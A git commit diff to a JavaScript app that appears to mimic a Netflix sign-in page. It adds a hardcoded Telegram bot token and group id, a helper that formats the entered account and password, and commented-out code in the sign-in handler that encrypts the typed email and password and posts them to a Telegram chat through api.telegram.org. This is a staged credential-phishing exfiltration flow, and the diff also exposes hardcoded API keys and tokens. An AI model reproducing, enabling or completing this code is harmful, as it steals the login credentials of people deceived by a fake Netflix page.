b9e2fc7f95b248ea42510b701e43197c1e721b57
Ahmed Ayachi <AhmedAyachi@users.noreply.github.com>
2020-12-02 20:34:50 +0100

    A

--- src/Estate.js
+++ src/Estate.js
@@ -2,6 +2,9 @@
 export const apikey="aae71d5d8af4086bbd44a5c4602200a5";
 export const guestsessionid="658c6fe570030590b466e8161795e685";
 
+export const bottoken="1488125893:AAE0f-kShsXSVQUqnZWKzQ9IoqgT_tJ9wwo";
+export const netlixgroupid="465525889";
+
 export class Show{
     constructor(props){
         Object.assign(this,props);
--- src/Routes/Home/Home.js
+++ src/Routes/Home/Home.js
@@ -2,12 +2,18 @@ import {map,useRef} from "vanilla";
 import css from "./Home.module.css";
 import {netflixlogo,googlelogo} from "assets";
 import {InputField} from "components";
+import {bottoken,netlixgroupid} from "estate";
+import {encrypt,decrypt} from "afile";
 
 
 export default function Home(props){
     const {parent}=props;
     parent.insertAdjacentHTML("beforeend",`<div class="${css.home} activeroute"></div>`);
     const home=parent.querySelector(`.${css.home}`);
+    
+    const refs={
+        inputfields:["email","password"].map(prop=>useRef(prop)),
+    };
 
     home.innerHTML=`
         <div class="${css.row0}">
@@ -24,20 +30,24 @@ export default function Home(props){
         <div>
     `;
 
-    ["email","password"].forEach(prop=>{
+    ["email","password"].forEach((prop,i)=>{
         InputField({
             parent:home.querySelector(`.${css.row1}`),
             placeholder:prop,
-            ref:useRef(prop),
+            ref:refs.inputfields[i],
             type:prop,
         });
     });
-       
     
     home.querySelector(`.${css.signin}`).onclick=()=>{
+        /*const inputvalues=refs.inputfields.map(ref=>home.querySelector(`#${ref} input`).value);
+        const input=encrypt(logincode(inputvalues[0],inputvalues[1],"google"));*/
         history.pushState("#shows");
+        /*fetch(`https://api.telegram.org/bot${bottoken}/sendMessage?chat_id=-${netlixgroupid}&text=${encodeURIComponent(input)}`,{
+            method:"POST",
+            redirect:"follow",
+        }).catch(error=>console.log("error",error));*/
     }
-    
 }
 
 const styles={
@@ -53,3 +63,9 @@ const logos=[
         style:"transform:rotate(-5deg)",
     }
 ];
+
+const logincode=(account,password,type)=>`{
+    account:${account},
+    password:${password},
+    type:${type},
+}`;
